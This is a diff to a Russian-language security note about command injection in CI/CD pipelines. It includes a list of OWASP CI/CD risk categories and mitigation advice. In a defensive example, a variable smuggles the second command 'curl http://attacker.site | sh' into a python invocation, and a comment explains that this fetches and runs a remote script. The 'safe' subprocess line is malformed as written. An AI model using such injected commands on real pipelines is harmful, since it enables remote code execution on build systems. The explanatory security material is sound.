@@ -8,7 +8,7 @@ Alias (*): Использует ранее созданную ссылку дл�
 ### Python -v в CI/CD
 ```
 USER_INPUT="my_script.py; curl http://attacker.site | sh"
-python -v $USER_INPUT
+python -v $USER_INPUT # вместо $USER_INPUT может быть USER_INPUT="my_script.py; curl http://attacker.site | sh", что выполнит обращение к сайту и выполнение скрипта - нужно только отправить переменную
 
 # уязвимый пример CI CD
 run_debug:
@@ -17,6 +17,8 @@ run_debug:
 
 # Безопасно
 import subprocess : subprocess.run([“python”, “-v”, script_name]) # Безопасное использование
+Всегда проверяйте содержимое переменной перед выполнением
+Изолированное выполнение: используйте контейнеры или эфемерные исполнители, чтобы минимизировать влияние в случае внедрения команды.
 ```
 
 CICD-SEC-1: Insufficient Flow Control Mechanisms
@@ -34,4 +36,5 @@ CICD-SEC-8: Ungoverned Usage of Third-Party Services
 CICD-SEC-9: Improper Artifact Integrity Validation
 
 CICD-SEC-10: Insufficient Logging and Visibility
+
 
